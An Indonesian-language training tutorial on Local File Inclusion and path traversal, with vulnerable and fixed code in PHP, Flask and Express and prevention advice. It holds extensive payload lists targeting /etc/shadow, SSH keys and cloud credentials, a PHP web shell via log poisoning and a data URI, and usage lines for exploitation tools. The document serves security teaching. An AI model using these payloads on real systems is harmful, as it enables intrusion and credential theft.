# Local File Inclusion (LFI) dan Path Traversal

## Pengertian

### Local File Inclusion (LFI)

Local File Inclusion (LFI) adalah kerentanan yang terjadi ketika aplikasi web menyertakan file lokal dari server ke dalam proses eksekusi tanpa validasi input yang memadai. Kerentanan ini memungkinkan penyerang membaca file sensitif atau bahkan menjalankan kode berbahaya.

**Analogi:** Bayangkan sebuah perpustakaan yang mengizinkan pengunjung meminta buku apa pun tanpa memeriksa apakah pengunjung tersebut memiliki izin untuk meminjamnya. Seseorang bisa meminta dokumen rahasia yang seharusnya tidak dapat diakses.

### Path Traversal

Path Traversal (atau Directory Traversal) adalah kerentanan yang memungkinkan penyerang mengakses file di luar direktori yang seharusnya dengan memanipulasi input path menggunakan karakter seperti `../`.

**Analogi:** Seperti seseorang yang diberikan akses ke satu ruangan di gedung, tetapi karena pintu antar ruangan tidak dikunci, mereka bisa berjalan ke ruangan lain yang seharusnya tidak dapat diakses.

## Contoh Source Code yang Rentan LFI dan Path Traversal

### 1. PHP - LFI dengan include()

**Kode Rentan:**
```php
<?php
// BAHAYA: Input pengguna langsung digunakan dalam include tanpa validasi
$page = $_GET['page'];
include($page);
?>

<!-- Penggunaan -->
<a href="?page=home.php">Home</a>
<a href="?page=about.php">About</a>
<a href="?page=contact.php">Contact</a>
```

**Kode Aman:**
```php
<?php
// AMAN: Gunakan whitelist halaman yang diizinkan
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed_pages)) {
    die("Invalid page");
}

// AMAN: Include file dari daftar yang sudah ditentukan
include($page . '.php');
?>
```

### 2. PHP - Path Traversal dengan readfile()

**Kode Rentan:**
```php
<?php
// BAHAYA: Input pengguna langsung digabungkan dengan path file
$file = $_GET['file'];
readfile("uploads/" . $file);
?>
```

**Kode Aman:**
```php
<?php
$file = $_GET['file'];

// AMAN: Validasi nama file dan gunakan realpath
$base_dir = realpath('uploads/');
$file_path = realpath("uploads/" . $file);

// Pastikan file berada di dalam direktori yang diizinkan
if ($file_path === false || strpos($file_path, $base_dir) !== 0) {
    die("Invalid file path");
}

// AMAN: Baca file setelah validasi
readfile($file_path);
?>
```

### 3. Python (Flask) - Path Traversal

**Kode Rentan:**
```python
from flask import Flask, request, send_file
import os

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('file')
    # BAHAYA: Input pengguna langsung digabungkan dengan path
    file_path = os.path.join('uploads', filename)
    return send_file(file_path)

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request, send_file
import os

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # AMAN: Gunakan basename untuk mencegah traversal
    safe_filename = os.path.basename(filename)
    
    # AMAN: Validasi path dengan realpath
    base_dir = os.path.realpath('uploads')
    file_path = os.path.realpath(os.path.join('uploads', safe_filename))
    
    # Pastikan file berada di dalam direktori uploads
    if not file_path.startswith(base_dir):
        return "Invalid file path", 400
    
    if not os.path.exists(file_path):
        return "File not found", 404
    
    return send_file(file_path)

if __name__ == "__main__":
    app.run(debug=True)
```

### 4. Node.js (Express) - Path Traversal

**Kode Rentan:**
```javascript
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.get('/read', (req, res) => {
    const filename = req.query.file;
    // BAHAYA: Input pengguna langsung digabungkan dengan path
    const filePath = 'uploads/' + filename;
    fs.readFile(filePath, (err, data) => {
        if (err) {
            return res.status(404).send('File not found');
        }
        res.send(data);
    });
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.get('/read', (req, res) => {
    const filename = req.query.file;
    
    // AMAN: Gunakan path.resolve dan validasi
    const uploadsDir = path.resolve('uploads');
    const filePath = path.resolve(uploadsDir, filename);
    
    // Pastikan file berada di dalam direktori uploads
    if (!filePath.startsWith(uploadsDir)) {
        return res.status(400).send('Invalid file path');
    }
    
    fs.readFile(filePath, (err, data) => {
        if (err) {
            return res.status(404).send('File not found');
        }
        res.send(data);
    });
});

app.listen(3000);
```

## Mekanisme Kerentanan

### Contoh Kode PHP Rentan LFI

```php
<?php
  $page = $_GET['page'];
  include($page);
?>
```

Kode di atas langsung menggunakan input pengguna tanpa validasi. Jika input tidak disaring, file apa pun dapat disertakan.

### Contoh Kode PHP Rentan Path Traversal

```php
<?php
  $file = $_GET['file'];
  readfile("uploads/" . $file);
?>
```

Kode di atas menggabungkan input pengguna dengan path direktori. Penyerang dapat menggunakan `../` untuk keluar dari direktori `uploads/` dan mengakses file di lokasi lain.

## Contoh Payload

### Payload LFI

```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://input (dengan POST data berisi kode PHP)
```

### Payload Path Traversal

```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=/flag.txt
```

**Catatan:** Karakter `../` digunakan untuk naik ke direktori induk. Pengulangan karakter ini memungkinkan penyerang mencapai direktori root sistem file.

## Tujuan Serangan

Penyerang umumnya bertujuan untuk:

- **Membaca file sensitif** -- Seperti `/etc/passwd`, `config.php`, `.env`, atau `wp-config.php`
- **Melakukan Remote Code Execution** -- Dengan memanfaatkan log poisoning atau menyertakan file berbahaya
- **Membaca kredensial** -- Seperti token API, password database, atau session file
- **Memetakan struktur server** -- Mengetahui file dan direktori apa saja yang ada di server

## Perbedaan LFI dan Path Traversal

| Aspek | Local File Inclusion (LFI) | Path Traversal |
|-------|---------------------------|----------------|
| Tujuan | Menyisipkan dan menjalankan file | Membaca file di luar direktori yang diizinkan |
| Fungsi PHP Rentan | `include()`, `require()` | `readfile()`, `fopen()`, `file_get_contents()` |
| Eksekusi Kode | Dapat menjalankan file (jika file PHP) | Hanya membaca file, tidak menjalankan |
| Bahasa Pemrograman | Umumnya ditemukan di PHP | Dapat terjadi di semua bahasa pemrograman |
| Risiko Tambahan | Dapat digunakan untuk Remote Code Execution | Umumnya hanya untuk membaca file |

## Kumpulan Payload LFI dan Path Traversal

### Payload Dasar Path Traversal

**Traversal dengan `../`:**
```
../../../../etc/passwd
../../../etc/passwd
../../../../etc/shadow
../../../../var/log/apache2/access.log
```

**Traversal dengan encoding:**
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    -- URL encoding
..%252f..%252f..%252fetc%252fpasswd        -- Double URL encoding
%2e%2e/%2e%2e/%2e%2e/etc/passwd            -- Partial encoding
```

**Traversal dengan variasi:**
```
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd    -- UTF-8 encoding
/././././././././etc/passwd
....\\....\\....\\etc\\passwd                -- Windows style
```

### Payload LFI untuk Membaca File Sensitif

**File sistem Linux:**
```
?page=/etc/passwd
?page=/etc/shadow
?page=/etc/hosts
?page=/etc/mysql/my.cnf
?page=/etc/apache2/apache2.conf
?page=/etc/nginx/nginx.conf
?page=/proc/self/environ
?page=/proc/version
?page=/proc/cmdline
```

**File aplikasi web:**
```
?page=config.php
?page=.env
?page=wp-config.php
?page=database.yml
?page=settings.py
?page=config.json
?page=application.properties
```

**File log:**
```
?page=/var/log/apache2/access.log
?page=/var/log/apache2/error.log
?page=/var/log/nginx/access.log
?page=/var/log/auth.log
?page=/var/log/syslog
```

**File kredensial:**
```
?page=/root/.ssh/id_rsa
?page=/root/.ssh/authorized_keys
?page=/home/user/.mysql_history
?page=/home/user/.bash_history
?page=/root/.aws/credentials
```

### Payload LFI untuk Eksekusi Kode

**PHP Filter (Base64 Encode):**
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
```

**PHP Input (Log Poisoning):**
```
?page=php://input
POST data: <?php system($_GET['cmd']); ?>

?page=/var/log/apache2/access.log&cmd=id
```

**Data URI:**
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

**Expect Wrapper:**
```
?page=expect://id
?page=expect://ls
?page=expect://cat /etc/passwd
```

### Payload Path Traversal Windows

**File Windows sensitif:**
```
?file=../../../../Windows/system32/drivers/etc/hosts
?file=../../../../Windows/win.ini
?file=../../../../Windows/system32/config/sam
?file=../../../../boot.ini
?file=C:\Windows\system32\drivers\etc\hosts
```

### Payload Bypass Filter

**Jika `../` difilter:**
```
?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?file=%2e%2e%2f%2e%2e%2fetc/passwd
```

**Jika `/etc/passwd` diblokir:**
```
?file=/etc/passwd%00 (null byte)
?file=/etc/passwd%20 (space)
?file=/etc/passwd/ (trailing slash)
?file=/etc/./passwd (current dir)
```

**Jika `include` dibatasi direktori:**
```
?page=php://filter/convert.base64-encode/resource=index
?page=data://text/plain,<?php phpinfo(); ?>
```

## Tools untuk Pengujian LFI dan Path Traversal

### 1. Burp Suite

Burp Suite dapat digunakan untuk pengujian LFI dan Path Traversal secara manual:

- **Intruder** -- Mengirim berbagai payload secara otomatis
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi LFI secara otomatis

**Payload list untuk Intruder:**
```
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
```

### 2. dotdotpwn

dotdotpwn adalah alat otomatis untuk mendeteksi Path Traversal.

**Instalasi:**
```bash
git clone https://github.com/wireghoul/dotdotpwn.git
cd dotdotpwn
cpanm HTTP::Request
```

**Penggunaan:**
```bash
-- Menguji LFI
perl dotdotpwn.pl -h target.com -m http -u http://target.com/page?page=TRAVERSAL -f /etc/passwd -k "root:"

-- Menguji dengan cookie
perl dotdotpwn.pl -h target.com -m http -u http://target.com/page?page=TRAVERSAL -C "session=xyz"

-- Menggunakan metode HTTP tertentu
perl dotdotpwn.pl -h target.com -m http-url -u http://target.com/page?page=TRAVERSAL
```

### 3. fimap

fimap adalah alat untuk mendeteksi dan mengeksploitasi File Inclusion vulnerabilities.

**Instalasi:**
```bash
git clone https://github.com/kurobeats/fimap.git
cd fimap
python fimap.py --help
```

**Penggunaan:**
```bash
-- Scan URL untuk LFI/RFI
python fimap.py -u 'http://target.com/page?page=test'

-- Scan dengan Google dorking
python fimap.py -g 'inurl:"page="'

-- Eksploitasi LFI yang ditemukan
python fimap.py -x
```

### 4. OWASP ZAP

OWASP ZAP memiliki fitur untuk mendeteksi Path Traversal:

- **Active Scan** -- Otomatis mendeteksi path traversal vulnerabilities
- **Fuzzer** -- Mengirim berbagai payload untuk menguji kerentanan

### 5. PayloadsAllTheThings

Repositori lengkap berisi payload LFI dan Path Traversal:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

### 6. LFISuite

LFISuite adalah alat otomatis untuk eksploitasi LFI.

**Instalasi:**
```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python lfisuite.py
```

**Penggunaan:**
```bash
-- Mode interaktif
python lfisuite.py

-- Auto exploitation
python lfisuite.py -a http://target.com/page?page=
```

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan LFI atau Path Traversal:

1. **Uji dengan `../` traversal** -- Input `../../../../etc/passwd` dan perhatikan respons
2. **Uji dengan encoding** -- Coba URL encoding atau double encoding
3. **Periksa error message** -- Error dari fungsi file dapat mengungkap path server
4. **Uji berbagai parameter** -- Coba injection di semua parameter yang menerima nama file atau path
5. **Uji dengan php://filter** -- Jika PHP, coba `php://filter/convert.base64-encode/resource=index.php`

## Metode Pencegahan

1. **Validasi input secara ketat** -- Jangan gunakan input pengguna langsung dalam fungsi include atau file reading
   
   ```php
   // Daripada:
   include($_GET['page']);
   
   // Gunakan whitelist:
   $allowed = ['home', 'about', 'contact'];
   if (in_array($_GET['page'], $allowed)) {
       include($_GET['page'] . '.php');
   }
   ```

2. **Gunakan whitelist** -- Tetapkan daftar file yang diizinkan dan tolak input lainnya
   
   ```python
   allowed_files = ['report.pdf', 'manual.pdf']
   if filename not in allowed_files:
       return "File not allowed", 403
   ```

3. **Hindari parameter dinamis untuk file** -- Jika memungkinkan, gunakan pemetaan file berdasarkan ID, bukan nama file
   
   ```php
   $file_map = [
       1 => 'home.php',
       2 => 'about.php',
       3 => 'contact.php'
   ];
   
   $page_id = $_GET['id'];
   if (isset($file_map[$page_id])) {
       include($file_map[$page_id]);
   }
   ```

4. **Batasi akses direktori** -- Konfigurasi server untuk membatasi akses hanya ke direktori yang diperlukan
   
   **PHP (php.ini):**
   ```ini
   open_basedir = /var/www/html:/tmp
   ```

5. **Gunakan fungsi basename() atau realpath()** -- Normalisasi path file untuk mencegah manipulasi `../`
   
   ```php
   $file = basename($_GET['file']);
   $real_path = realpath("uploads/" . $file);
   
   if (strpos($real_path, realpath("uploads/")) !== 0) {
       die("Invalid file");
   }
   ```

6. **Nonaktifkan allow_url_include** -- Pada PHP, pastikan `allow_url_include` disetel ke `Off` untuk mencegah inklusi file jarak jauh
   
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

7. **Gunakan chroot atau container** -- Jalankan aplikasi dalam lingkungan terisolasi untuk membatasi akses file

## Latihan Praktis

Silakan lanjutkan ke direktori `challange/` untuk latihan berbasis skenario.

## Referensi Lanjutan

- OWASP File Inclusion
- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- PortSwigger: Path Traversal -- https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings File Inclusion -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- dotdotpwn -- https://github.com/wireghoul/dotdotpwn
- LFISuite -- https://github.com/D35m0nd142/LFISuite
